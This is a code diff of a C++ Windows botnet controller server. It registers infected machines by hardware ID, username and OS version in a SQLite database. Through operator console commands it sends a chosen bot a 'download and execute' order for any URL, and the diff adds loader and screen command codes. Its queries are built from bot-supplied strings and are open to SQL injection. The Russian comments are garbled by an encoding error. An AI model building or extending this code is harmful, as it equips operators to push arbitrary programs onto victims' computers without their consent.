@@ -1,4 +1,4 @@
-#include "winsock.h"
+п»ї#include "winsock.h"
 #include "sqlite3.h"
 #include "stdio.h"
 #include <string>
@@ -14,6 +14,13 @@ using namespace std;
 
 sqlite3* db;
 
+#define CMD_HADSHAKE	0x00
+#define CMD_ONLINE		0x01
+#define CMD_OTVET_OK	0x02
+#define CMD_OTVET_ER	0x03
+#define CMD_SCREEN		0x04
+#define CMD_LOADER		0x05
+
 struct CLIENTS
 {
 	SOCKET SOCKET;
@@ -27,15 +34,14 @@ struct DLE
 	char URL[1000];
 };
 
-CLIENTS SOCKETS[10000];
-
-int count_clients;
-
 struct CMDiDATA
 {
 	DWORD CMD;
-	char DATA[1000];
+	char DATA[4000];
 };
+
+CLIENTS SOCKETS[10000];
+int count_clients;
 
 BOOL sendint(SOCKET con, int i)
 {
@@ -83,6 +89,11 @@ DWORD WINAPI isOnline(LPVOID param)
 	}
 }
 
+DWORD WINAPI RecvThread(LPVOID param)
+{
+	return 0;
+}
+
 void PrintOnlineClients()
 {
 	sqlite3_stmt* stmt;
@@ -115,22 +126,22 @@ DWORD WINAPI ConsoleReader(LPVOID param)
 {
 	while (TRUE)
 	{
-		string line = { 0 }; //инициализируем класс стринг
-		getline(cin, line); //считываем символы в этот класс из консоли
-		char* mycmd = strdup(line.c_str()); //конвертируем эти сиволы в чары, вызывая метод с_str
+		string line = { 0 }; //РёРЅРёС†РёР°Р»РёР·РёСЂСѓРµРј РєР»Р°СЃСЃ СЃС‚СЂРёРЅРі
+		getline(cin, line); //СЃС‡РёС‚С‹РІР°РµРј СЃРёРјРІРѕР»С‹ РІ СЌС‚РѕС‚ РєР»Р°СЃСЃ РёР· РєРѕРЅСЃРѕР»Рё
+		char* mycmd = strdup(line.c_str()); //РєРѕРЅРІРµСЂС‚РёСЂСѓРµРј СЌС‚Рё СЃРёРІРѕР»С‹ РІ С‡Р°СЂС‹, РІС‹Р·С‹РІР°СЏ РјРµС‚РѕРґ СЃ_str
 
-		if ((mycmd[0] == 'c' && mycmd[1] == 'm' && mycmd[2] == 'd')) // если наша команда равна 'cmd'
+		if ((mycmd[0] == 'c' && mycmd[1] == 'm' && mycmd[2] == 'd')) // РµСЃР»Рё РЅР°С€Р° РєРѕРјР°РЅРґР° СЂР°РІРЅР° 'cmd'
 		{
-			//тут мы создаем какую нибудь команду и отсылаем ее клиенту
-			if (mycmd[3] == ':') // если следуший символ двоеточие
+			//С‚СѓС‚ РјС‹ СЃРѕР·РґР°РµРј РєР°РєСѓСЋ РЅРёР±СѓРґСЊ РєРѕРјР°РЅРґСѓ Рё РѕС‚СЃС‹Р»Р°РµРј РµРµ РєР»РёРµРЅС‚Сѓ
+			if (mycmd[3] == ':') // РµСЃР»Рё СЃР»РµРґСѓС€РёР№ СЃРёРјРІРѕР» РґРІРѕРµС‚РѕС‡РёРµ
 			{
-				int NOMER = 0; //создаем число которое изначально будет равно нулю
+				int NOMER = 0; //СЃРѕР·РґР°РµРј С‡РёСЃР»Рѕ РєРѕС‚РѕСЂРѕРµ РёР·РЅР°С‡Р°Р»СЊРЅРѕ Р±СѓРґРµС‚ СЂР°РІРЅРѕ РЅСѓР»СЋ
 
-				char NUMCHAR[sizeof(int)]; //создаем массив чаров по размеру числа
-				memset(NUMCHAR, 0, sizeof(NUMCHAR)); //очищаем его
+				char NUMCHAR[sizeof(int)]; //СЃРѕР·РґР°РµРј РјР°СЃСЃРёРІ С‡Р°СЂРѕРІ РїРѕ СЂР°Р·РјРµСЂСѓ С‡РёСЃР»Р°
+				memset(NUMCHAR, 0, sizeof(NUMCHAR)); //РѕС‡РёС‰Р°РµРј РµРіРѕ
 				
-				//создаем цикл в котором будем перебирать символы в команде, пока не наткнемся на двоеточие,
-				//если символ не равен двоеточию он будет записан в NUMCHAR
+				//СЃРѕР·РґР°РµРј С†РёРєР» РІ РєРѕС‚РѕСЂРѕРј Р±СѓРґРµРј РїРµСЂРµР±РёСЂР°С‚СЊ СЃРёРјРІРѕР»С‹ РІ РєРѕРјР°РЅРґРµ, РїРѕРєР° РЅРµ РЅР°С‚РєРЅРµРјСЃСЏ РЅР° РґРІРѕРµС‚РѕС‡РёРµ,
+				//РµСЃР»Рё СЃРёРјРІРѕР» РЅРµ СЂР°РІРµРЅ РґРІРѕРµС‚РѕС‡РёСЋ РѕРЅ Р±СѓРґРµС‚ Р·Р°РїРёСЃР°РЅ РІ NUMCHAR
 				int i, j; 
 				for (i = 4, j = 0; ; i++, j++)
 				{
@@ -138,41 +149,45 @@ DWORD WINAPI ConsoleReader(LPVOID param)
 					{
 						break;
 					}
+					if (mycmd[i] == 0)
+					{
+						goto errparce;
+					}
 					NUMCHAR[j] = mycmd[i];
 				}
-				//конвертируем NUMCHAR в число NOMER
+				//РєРѕРЅРІРµСЂС‚РёСЂСѓРµРј NUMCHAR РІ С‡РёСЃР»Рѕ NOMER
 				NOMER = atoi(NUMCHAR);
 				
-				//а теперь начинаем парсить команды команд:) тафталогия но и всё равно
-				if ((mycmd[i + 1] == 'd' && mycmd[i + 2] == 'l' && mycmd[i + 3] == 'e')) //download and execute - скачать и запустить
+				//Р° С‚РµРїРµСЂСЊ РЅР°С‡РёРЅР°РµРј РїР°СЂСЃРёС‚СЊ РєРѕРјР°РЅРґС‹ РєРѕРјР°РЅРґ:) С‚Р°С„С‚Р°Р»РѕРіРёСЏ РЅРѕ Рё РІСЃС‘ СЂР°РІРЅРѕ
+				if ((mycmd[i + 1] == 'd' && mycmd[i + 2] == 'l' && mycmd[i + 3] == 'e')) //download and execute - СЃРєР°С‡Р°С‚СЊ Рё Р·Р°РїСѓСЃС‚РёС‚СЊ
 				{
-					if (mycmd[i + 4] == ':') //если некст символ равен двоеточию
+					if (mycmd[i + 4] == ':') //РµСЃР»Рё РЅРµРєСЃС‚ СЃРёРјРІРѕР» СЂР°РІРµРЅ РґРІРѕРµС‚РѕС‡РёСЋ
 					{
-						//то начинаем чистать в чары url наш урл из команды
+						//С‚Рѕ РЅР°С‡РёРЅР°РµРј С‡РёСЃС‚Р°С‚СЊ РІ С‡Р°СЂС‹ url РЅР°С€ СѓСЂР» РёР· РєРѕРјР°РЅРґС‹
 						char url[1000]; 
 						memset(url, 0, sizeof(url));
 						int x, y;
 						for (x = i + 5, y = 0; ; x++, y++)
 						{
-							if (mycmd[x] == 0) //пока строка не завершится
+							if (mycmd[x] == 0) //РїРѕРєР° СЃС‚СЂРѕРєР° РЅРµ Р·Р°РІРµСЂС€РёС‚СЃСЏ
 							{
 								break;
 							}
 							url[y] = mycmd[x];
 						}
-						if (url[0] != 0) //если первый символ массива чаров url не равен нулю
+						if (url[0] != 0) //РµСЃР»Рё РїРµСЂРІС‹Р№ СЃРёРјРІРѕР» РјР°СЃСЃРёРІР° С‡Р°СЂРѕРІ url РЅРµ СЂР°РІРµРЅ РЅСѓР»СЋ
 						{
 							printf("\n\t zagruzka u vupolnenie url: %s...; NOMER: %d", url, NOMER);
-							CMDiDATA indata; //создаем структуру отвечающую за протокол
-							DLE dlecmd; //инициализируем структуру которая будет отвечать за хранение URL
-							//по сути мы могли бы просто скопировать урл в indata.DATA, но я тут конечно
-							//немного расширю данную функциональность структуры, так что лучше будет так 
-							memset(&indata, 0, sizeof(CMDiDATA)); //почистим
-							memset(&dlecmd, 0, sizeof(DLE)); //почистим
-							memcpy(dlecmd.URL, url, sizeof(url)); //скопируем url в структуру DLE
-							indata.CMD = 1; //присвоим номер команды для загрузки файла
-							memcpy(indata.DATA, dlecmd.URL, sizeof(dlecmd.URL)); //скопируем DLE в indata.DATA
-							send(SOCKETS[NOMER].SOCKET, (char*)&indata, sizeof(CMDiDATA), 0); //отпарвляем протокольную структуру на клиент по номеру NOMER в массиве SOCKETS
+							CMDiDATA indata; //СЃРѕР·РґР°РµРј СЃС‚СЂСѓРєС‚СѓСЂСѓ РѕС‚РІРµС‡Р°СЋС‰СѓСЋ Р·Р° РїСЂРѕС‚РѕРєРѕР»
+							DLE dlecmd; //РёРЅРёС†РёР°Р»РёР·РёСЂСѓРµРј СЃС‚СЂСѓРєС‚СѓСЂСѓ РєРѕС‚РѕСЂР°СЏ Р±СѓРґРµС‚ РѕС‚РІРµС‡Р°С‚СЊ Р·Р° С…СЂР°РЅРµРЅРёРµ URL
+							//РїРѕ СЃСѓС‚Рё РјС‹ РјРѕРіР»Рё Р±С‹ РїСЂРѕСЃС‚Рѕ СЃРєРѕРїРёСЂРѕРІР°С‚СЊ СѓСЂР» РІ indata.DATA, РЅРѕ СЏ С‚СѓС‚ РєРѕРЅРµС‡РЅРѕ
+							//РЅРµРјРЅРѕРіРѕ СЂР°СЃС€РёСЂСЋ РґР°РЅРЅСѓСЋ С„СѓРЅРєС†РёРѕРЅР°Р»СЊРЅРѕСЃС‚СЊ СЃС‚СЂСѓРєС‚СѓСЂС‹, С‚Р°Рє С‡С‚Рѕ Р»СѓС‡С€Рµ Р±СѓРґРµС‚ С‚Р°Рє 
+							memset(&indata, 0, sizeof(CMDiDATA)); //РїРѕС‡РёСЃС‚РёРј
+							memset(&dlecmd, 0, sizeof(DLE)); //РїРѕС‡РёСЃС‚РёРј
+							memcpy(dlecmd.URL, url, sizeof(url)); //СЃРєРѕРїРёСЂСѓРµРј url РІ СЃС‚СЂСѓРєС‚СѓСЂСѓ DLE
+							indata.CMD = CMD_LOADER; //РїСЂРёСЃРІРѕРёРј РЅРѕРјРµСЂ РєРѕРјР°РЅРґС‹ РґР»СЏ Р·Р°РіСЂСѓР·РєРё С„Р°Р№Р»Р°
+							memcpy(indata.DATA, dlecmd.URL, sizeof(dlecmd.URL)); //СЃРєРѕРїРёСЂСѓРµРј DLE РІ indata.DATA
+							send(SOCKETS[NOMER].SOCKET, (char*)&indata, sizeof(CMDiDATA), 0); //РѕС‚РїР°СЂРІР»СЏРµРј РїСЂРѕС‚РѕРєРѕР»СЊРЅСѓСЋ СЃС‚СЂСѓРєС‚СѓСЂСѓ РЅР° РєР»РёРµРЅС‚ РїРѕ РЅРѕРјРµСЂСѓ NOMER РІ РјР°СЃСЃРёРІРµ SOCKETS
 						}
 					}
 				}
@@ -180,14 +195,17 @@ DWORD WINAPI ConsoleReader(LPVOID param)
 		}
 		else if ((mycmd[0] == 'o' && mycmd[1] == 'n' && mycmd[2] == 'l'))
 		{
-			//печатаем всех клиентов онлайн
+			//РїРµС‡Р°С‚Р°РµРј РІСЃРµС… РєР»РёРµРЅС‚РѕРІ РѕРЅР»Р°Р№РЅ
 			PrintOnlineClients(); 
 		}
 		else if ((mycmd[0] == 'c' && mycmd[1] == 'l' && mycmd[2] == 's'))
 		{
-			//очистим консоль
+			//РѕС‡РёСЃС‚РёРј РєРѕРЅСЃРѕР»СЊ
 			system("cls"); 
 		}
+
+	errparce:
+		continue;
 	}
 }
 
@@ -203,6 +221,8 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	freopen("CONOUT$", "w", stderr);
 
 	count_clients = 0;
+
+	memset(SOCKETS, 0, sizeof(SOCKETS));
 
 	WSAData wsaData;
 	WORD DLLVersion = MAKEWORD(2, 1);
@@ -223,72 +243,72 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	
 	if (!rc)
 	{
-		CreateThread(NULL, 0, Title, NULL, 0, 0); //вызываем функцию записи кол-ва клиентов в заголовок консоли
-		CreateThread(NULL, 0, isOnline, NULL, 0, 0); //вызываем функцию проверки на онлайн наших клиентов
-		CreateThread(NULL, 0, ConsoleReader, NULL, 0, 0); //вызываем функцию считывания из консоли нашего ввода
+		CreateThread(NULL, 0, Title, NULL, 0, 0); //РІС‹Р·С‹РІР°РµРј С„СѓРЅРєС†РёСЋ Р·Р°РїРёСЃРё РєРѕР»-РІР° РєР»РёРµРЅС‚РѕРІ РІ Р·Р°РіРѕР»РѕРІРѕРє РєРѕРЅСЃРѕР»Рё
+		CreateThread(NULL, 0, isOnline, NULL, 0, 0); //РІС‹Р·С‹РІР°РµРј С„СѓРЅРєС†РёСЋ РїСЂРѕРІРµСЂРєРё РЅР° РѕРЅР»Р°Р№РЅ РЅР°С€РёС… РєР»РёРµРЅС‚РѕРІ
+		CreateThread(NULL, 0, ConsoleReader, NULL, 0, 0); //РІС‹Р·С‹РІР°РµРј С„СѓРЅРєС†РёСЋ СЃС‡РёС‚С‹РІР°РЅРёСЏ РёР· РєРѕРЅСЃРѕР»Рё РЅР°С€РµРіРѕ РІРІРѕРґР°
 
-		for (;;) //цикл приема клиентов - он будет ожидать выполнения accept
+		for (;;) //С†РёРєР» РїСЂРёРµРјР° РєР»РёРµРЅС‚РѕРІ - РѕРЅ Р±СѓРґРµС‚ РѕР¶РёРґР°С‚СЊ РІС‹РїРѕР»РЅРµРЅРёСЏ accept
 		{
-			sockaddr_in addr; //в другой раз объясню зчм
-							  //при подключении нового клиента каждый раз наша функция accept будет срабатывать
-							  //и новый клиент будет регистрироваться под сокетом newConn
+			sockaddr_in addr; //РІ РґСЂСѓРіРѕР№ СЂР°Р· РѕР±СЉСЏСЃРЅСЋ Р·С‡Рј
+							  //РїСЂРё РїРѕРґРєР»СЋС‡РµРЅРёРё РЅРѕРІРѕРіРѕ РєР»РёРµРЅС‚Р° РєР°Р¶РґС‹Р№ СЂР°Р· РЅР°С€Р° С„СѓРЅРєС†РёСЏ accept Р±СѓРґРµС‚ СЃСЂР°Р±Р°С‚С‹РІР°С‚СЊ
+							  //Рё РЅРѕРІС‹Р№ РєР»РёРµРЅС‚ Р±СѓРґРµС‚ СЂРµРіРёСЃС‚СЂРёСЂРѕРІР°С‚СЊСЃСЏ РїРѕРґ СЃРѕРєРµС‚РѕРј newConn
 			SOCKET newConn = accept(sListen, (sockaddr*)&addr, &sizeofaddr);
 			{
-				CMDiDATA indata; //создаем структуру отвечающую за протокол
-				CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
-				memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
-				memset(&client, 0, sizeof(CLIENTS)); //почистим
+				CMDiDATA indata; //СЃРѕР·РґР°РµРј СЃС‚СЂСѓРєС‚СѓСЂСѓ РѕС‚РІРµС‡Р°СЋС‰СѓСЋ Р·Р° РїСЂРѕС‚РѕРєРѕР»
+				CLIENTS client; //СЃРѕР·РґР°РµРј СЃС‚СЂСѓРєС‚СѓСЂСѓ РѕС‚РІРµС‡Р°СЋС‰СѓСЋ Р·Р° РёРЅС„Сѓ Рѕ РєР»РёРµРЅС‚Рµ
+				memset(&indata, 0, sizeof(CMDiDATA)); //РїРѕС‡РёСЃС‚РёРј 
+				memset(&client, 0, sizeof(CLIENTS)); //РїРѕС‡РёСЃС‚РёРј
 				
 				//recv(newConn, (char*)&indata, sizeof(CMDiDATA), 0);
-				if (sizeof(CMDiDATA) != recv(newConn, (char*)&indata, sizeof(CMDiDATA), 0)) //прием сообщения от клиента
+				if (sizeof(CMDiDATA) != recv(newConn, (char*)&indata, sizeof(CMDiDATA), 0)) //РїСЂРёРµРј СЃРѕРѕР±С‰РµРЅРёСЏ РѕС‚ РєР»РёРµРЅС‚Р°
 				{
 					closesocket(newConn);
 					continue;
 				}
 
-				if (indata.CMD == 0) //если CMD = 0, то это хендшейк
+				if (indata.CMD == CMD_HADSHAKE) //РµСЃР»Рё CMD = CMD_HADSHAKE, С‚Рѕ СЌС‚Рѕ С…РµРЅРґС€РµР№Рє
 				{
-					memcpy(&client, indata.DATA, sizeof(CLIENTS)); //копируем DATA в структуру client
+					memcpy(&client, indata.DATA, sizeof(CLIENTS)); //РєРѕРїРёСЂСѓРµРј DATA РІ СЃС‚СЂСѓРєС‚СѓСЂСѓ client
 
 					char* zapros_1 = new char[1000];
-					//тут было бы возможно провести sql инъекцию, если бы не SELECT *'; DROP TABLE BOT;-- 
+					//С‚СѓС‚ Р±С‹Р»Рѕ Р±С‹ РІРѕР·РјРѕР¶РЅРѕ РїСЂРѕРІРµСЃС‚Рё sql РёРЅСЉРµРєС†РёСЋ, РµСЃР»Рё Р±С‹ РЅРµ SELECT *'; DROP TABLE BOT;-- 
 					wsprintfA(zapros_1, "SELECT NOMER FROM BOT WHERE HWID='%s' AND USERNAME='%s' AND OSVER='%s'", client.HWID, client.USERNAME, client.OSVER);
 
 					sqlite3_stmt* stmt_1;
-					// тут мы ищем по хвиду, имени юзера, и версии ос запись в базе данных
+					// С‚СѓС‚ РјС‹ РёС‰РµРј РїРѕ С…РІРёРґСѓ, РёРјРµРЅРё СЋР·РµСЂР°, Рё РІРµСЂСЃРёРё РѕСЃ Р·Р°РїРёСЃСЊ РІ Р±Р°Р·Рµ РґР°РЅРЅС‹С…
 					if (sqlite3_prepare_v2(db, zapros_1, -1, &stmt_1, 0) == SQLITE_OK)
 					{
 						if (sqlite3_step(stmt_1) == SQLITE_ROW)
 						{
 							int NOMER = 0;
-							//если запись есть - то выполняется следующий код:
+							//РµСЃР»Рё Р·Р°РїРёСЃСЊ РµСЃС‚СЊ - С‚Рѕ РІС‹РїРѕР»РЅСЏРµС‚СЃСЏ СЃР»РµРґСѓСЋС‰РёР№ РєРѕРґ:
 							NOMER = sqlite3_column_int(stmt_1, 0);
 							char* zapros_2 = new char[1000];
 							wsprintfA(zapros_2, "UPDATE BOT SET OTVET='1' WHERE HWID='%s' AND USERNAME='%s' AND OSVER='%s'", client.HWID, client.USERNAME, client.OSVER);
 							char* ErrMsg = NULL;
-							//тут мы обновляем запись в базе данных делая поле ответ = 1, показывая что клиент теперь онлайн
+							//С‚СѓС‚ РјС‹ РѕР±РЅРѕРІР»СЏРµРј Р·Р°РїРёСЃСЊ РІ Р±Р°Р·Рµ РґР°РЅРЅС‹С… РґРµР»Р°СЏ РїРѕР»Рµ РѕС‚РІРµС‚ = 1, РїРѕРєР°Р·С‹РІР°СЏ С‡С‚Рѕ РєР»РёРµРЅС‚ С‚РµРїРµСЂСЊ РѕРЅР»Р°Р№РЅ
 							if (SQLITE_OK == sqlite3_exec(db, zapros_2, nullptr, nullptr, &ErrMsg))
 							{
 								SOCKETS[NOMER].SOCKET = newConn;
 								memcpy(SOCKETS[NOMER].HWID, client.HWID, sizeof(client.HWID));
 								memcpy(SOCKETS[NOMER].USERNAME, client.USERNAME, sizeof(client.USERNAME));
 								memcpy(SOCKETS[NOMER].OSVER, client.OSVER, sizeof(client.OSVER));
-								//тут может быть сигнал о том что клиент теперь онлайн
+								//С‚СѓС‚ РјРѕР¶РµС‚ Р±С‹С‚СЊ СЃРёРіРЅР°Р» Рѕ С‚РѕРј С‡С‚Рѕ РєР»РёРµРЅС‚ С‚РµРїРµСЂСЊ РѕРЅР»Р°Р№РЅ
 								count_clients++;
 							}
 							else
 							{
 								printf("ZAPROS: %s;\nError: %s\n", zapros_2, ErrMsg);
 							}
-							//чистим строку
+							//С‡РёСЃС‚РёРј СЃС‚СЂРѕРєСѓ
 							delete[] zapros_2;
 						}
-						else //если клиент не найден то берем самое максимальное число записи из бд
+						else //РµСЃР»Рё РєР»РёРµРЅС‚ РЅРµ РЅР°Р№РґРµРЅ С‚Рѕ Р±РµСЂРµРј СЃР°РјРѕРµ РјР°РєСЃРёРјР°Р»СЊРЅРѕРµ С‡РёСЃР»Рѕ Р·Р°РїРёСЃРё РёР· Р±Рґ
 						{
 							sqlite3_stmt* stmt_3;
 							if (sqlite3_prepare_v2(db, "SELECT NOMER FROM BOT ORDER BY NOMER DESC LIMIT 1", -1, &stmt_3, 0) == SQLITE_OK && sqlite3_step(stmt_3) == SQLITE_ROW)
 							{
-								int NEWNOMER = sqlite3_column_int(stmt_3, 0) + 1; // и плюсуем единичку
+								int NEWNOMER = sqlite3_column_int(stmt_3, 0) + 1; // Рё РїР»СЋСЃСѓРµРј РµРґРёРЅРёС‡РєСѓ
 								char* zapros_3 = new char[1000];
 								wsprintfA(zapros_3, \
 									"INSERT INTO BOT (NOMER, HWID, USERNAME, OSVER, OTVET) VALUES ('%d', '%s', '%s', '%s', 1)", \
@@ -300,7 +320,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 									memcpy(SOCKETS[NEWNOMER].HWID, client.HWID, sizeof(client.HWID));
 									memcpy(SOCKETS[NEWNOMER].USERNAME, client.USERNAME, sizeof(client.USERNAME));
 									memcpy(SOCKETS[NEWNOMER].OSVER, client.OSVER, sizeof(client.OSVER));
-									//сигнал тут может быть о том что новый клиент онлайн
+									//СЃРёРіРЅР°Р» С‚СѓС‚ РјРѕР¶РµС‚ Р±С‹С‚СЊ Рѕ С‚РѕРј С‡С‚Рѕ РЅРѕРІС‹Р№ РєР»РёРµРЅС‚ РѕРЅР»Р°Р№РЅ
 									printf("\n\nclient.HWID: %s\n\tlen: %d\n\nclient.USERNAME: %s\n\tlen: %d\n\nclient.OSVER: %s\n\tlen: %d\n\n", client.HWID, lstrlenA(client.HWID), client.USERNAME, lstrlenA(client.USERNAME), client.OSVER, lstrlenA(client.OSVER));
 									count_clients++;
 								}
@@ -309,7 +329,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 									printf("ZAPROS: %s;\nError: %s\n", zapros_3, ErrMsg);
 								}
 								sqlite3_finalize(stmt_3);
-								//чистим строку
+								//С‡РёСЃС‚РёРј СЃС‚СЂРѕРєСѓ
 								delete[] zapros_3;
 							}
 						}
@@ -319,13 +339,14 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 						printf("ZAPROS: %s;\nERR: %s\n", zapros_1, sqlite3_errmsg(db));
 					}
 					sqlite3_finalize(stmt_1);
-					//чистим строку
+					//С‡РёСЃС‚РёРј СЃС‚СЂРѕРєСѓ
 					delete[] zapros_1;
 				}
 			}
 		}
 	} 
-	else {
+	else 
+	{
 		printf("Can't open database: %s\n", sqlite3_errmsg(db));
 		system("pause");
 	}
